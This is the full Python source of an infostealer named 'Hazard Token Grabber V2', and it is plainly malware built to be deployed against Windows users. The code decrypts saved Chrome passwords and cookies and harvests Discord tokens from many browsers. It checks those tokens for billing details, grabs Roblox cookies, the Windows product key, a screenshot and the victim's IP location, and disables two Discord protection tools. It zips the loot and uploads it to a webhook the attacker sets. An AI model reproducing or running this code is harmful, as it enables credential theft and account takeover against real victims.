import os
import json
import httpx
import shutil
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess

from PIL import ImageGrab
from base64 import b64decode
from tempfile import mkdtemp
from re import findall
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

config = {
    'webhook': "%webhook%"
}


Victim = os.getlogin()
Victim_pc = os.getenv("COMPUTERNAME")
ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]

class Functions(object):
    @staticmethod
    def get_headers(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    @staticmethod
    def system_info() -> list:
        try:
            HWID = subprocess.check_output("wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
        except Exception:
            HWID = "N/A"
        try:
            wkey = subprocess.check_output(
                "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
                creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A"
        try:
            winver = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
                                             creationflags=0x08000000).decode().rstrip()
        except Exception:
            winver = "N/A"

        return [HWID, winver, wkey]

    @staticmethod
    def network_info() -> list:
        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc

        return [ip, city, country, region, org, loc, googlemap]

    @staticmethod
    def fetch_conf(e: str) -> str or bool | None:
        return config.get(e)


class HazardTokenGrabberV2(Functions):
    def __init__(self):
        self.webhook = self.fetch_conf('webhook')
        self.discordApi = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.chrome = self.appdata + "\\Google\\Chrome\\User Data\\"
        self.dir = mkdtemp()
        inf, net = self.system_info(), self.network_info()
        self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]
        self.startup_loc = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        self.hook_reg = "api/webhooks"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []

        os.makedirs(self.dir, exist_ok=True)

    def try_extract(func):
        '''Decorator to safely catch and ignore exceptions'''
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.discordApi,
                headers=self.get_headers(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        if self.webhook == "":
            os._exit(0)
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.sys_dump, self.grab_tokens, self.grabRobloxCookie]
        if self.fetch_conf('hide_self'):
            function_list.append(self.hide)

        if self.fetch_conf('kill_processes'):
            await self.killProcesses()

        if self.fetch_conf('startup'):
            function_list.append(self.startup)

        if os.path.exists(self.chrome + 'Default') and os.path.exists(self.chrome + 'Local State'):
            function_list.append(self.grabPassword)
            function_list.append(self.grabCookies)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        self.finish()

    async def bypassTokenProtector(self):
        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp):
            return
        config = tp + "config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp + i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")

    async def bypassBetterDiscord(self):
        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = self.hook_reg
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'RdimoTheGoat')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    @try_extract
    def grab_tokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.chrome + 'Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        master_key = self.get_master_key(self.chrome + 'Local State')
        login_db = self.chrome + 'default\\Login Data'
        login = self.dir + self.sep + "Loginvault1.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir + "\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        cursor.close()
        conn.close()
        os.remove(login)

    @try_extract
    def grabCookies(self):
        master_key = self.get_master_key(self.chrome + 'Local State')
        login_db = self.chrome + 'default\\Network\\cookies'
        login = self.dir + self.sep + "Loginvault2.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir + "\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                    self.robloxcookies.append(decrypted_cookie)
        cursor.close()
        conn.close()
        os.remove(login)

    def neatifyTokens(self):
        f = open(self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"

            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            nitro_data = httpx.get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabRobloxCookie(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir + "\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i + '\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def sys_dump(self):
        about = f"""
==========================
{Victim} | {Victim_pc}
==========================
Windows key: {self.winkey}
Windows version: {self.winver}
==========================
RAM: {ram}GB
DISK: {disk}GB
HWID: {self.hwid}
==========================
IP: {self.ip}
City: {self.city}
Country: {self.country}
Region: {self.region}
Org: {self.org}
GoogleMaps: {self.googlemap}
==========================
        """
        with open(self.dir + "\\System info.txt", "w", encoding="utf-8", errors='ignore') as f:
            f.write(about)

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir + self.sep + i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")

        _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{Victim}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"・{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Files Found: "

        embed = {
            'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                        'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                    },
                    'color': 176185,
                    'description': f'[Google Maps Location]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                WinKey:᠎ {self.winkey.replace(" ", "᠎ ")}
                                WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "No tokens extracted"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                [
                                {files_found.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': '🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
                    }
                }
            ]
        }
        with open(_zipfile, 'rb') as f:
            if self.hook_reg in self.webhook:
                httpx.post(self.webhook, json=embed)
                httpx.post(self.webhook, files={'upload_file': f})
            else:
                from pyotp import TOTP
                key = TOTP(self.fetch_conf('webhook_protector_key')).now()
                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
        os.remove(_zipfile)
        shutil.rmtree(self.dir, ignore_errors=True)

if __name__ == '__main__':
    try:
        httpx.get('https://google.com')
    except httpx.ConnectTimeout:
        os._exit(0)
    asyncio.run(HazardTokenGrabberV2().init())
